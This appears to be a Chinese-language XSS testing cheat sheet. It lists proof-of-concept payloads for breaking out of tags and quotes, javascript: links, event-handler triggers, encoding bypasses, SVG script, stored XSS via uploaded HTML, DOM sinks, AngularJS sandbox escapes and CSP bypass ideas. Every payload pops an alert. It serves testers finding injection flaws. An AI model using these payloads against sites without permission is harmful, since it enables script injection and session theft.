⚠️要么闭合标签，要么闭合引号⚠️  

## 常用POC:
- `"><script>alert(1)</script>`  
- `<img src=1 onerror=alert(1)>`  
- `" autofocus onfocus=alert(1) x="`  
- `<a href="javascript:alert(1)">`  
- `javascript:alert(1);`  
JavaScript伪协议，超链接的地方就可能会存在
- `"><svg onload=alert(1)>`  
- `<span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>`  
- `'-alert(1)-'`  
单引号作用：跳出前一个js

## 编码绕过POC：
- `&apos;-alert(1)-&apos;`  
- `';alert(1)//`
- 当单引号被转义时  
` \\';alert(1)// `
- 有引号处理文字时,如：var input='payload';  
` ${alert(1)} `
- url编码  
` %27%2dalert(1)%2d%27 `  
`%3Ca%20hREf%20%3D%20%27javasCriPt%3Aalert(%2Fxss%2F)%27%3Eclick%20me!%3C%2Fa%3E` javascript伪协议  

## 事件执行触发POC:
- accesskey:设置快捷键  
`<a href="url" accesskey="c">alert()</a>` ctrl+shift+c触发
- mouseover:鼠标移动  
`<span title="" onmouseover="alert(1)">" onmouseover="alert(1)"</span>`
- click:单击  
`<span title="" onclick="alert(1)">" onclick="alert(1)"</span>`

## SVG
```
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
	<circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
	<script>alert(1)</script>
</svg>
```

## 上传文件导致存储型XSS
上传文件修改为 `.html` ，内容为 `<img src=1 onerror=alert(document.domain)>`

## DOM XSS出现位置函数
`document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`

## 沙箱逃逸
- `toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
- `<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">`
- `{{$on.constructor('alert(1)')()}}`

## 绕过CSP
- 悬空标记注入，指定url地址后面用？跟参数
- 修改响应包中CSP指令，覆盖现有规则script-src等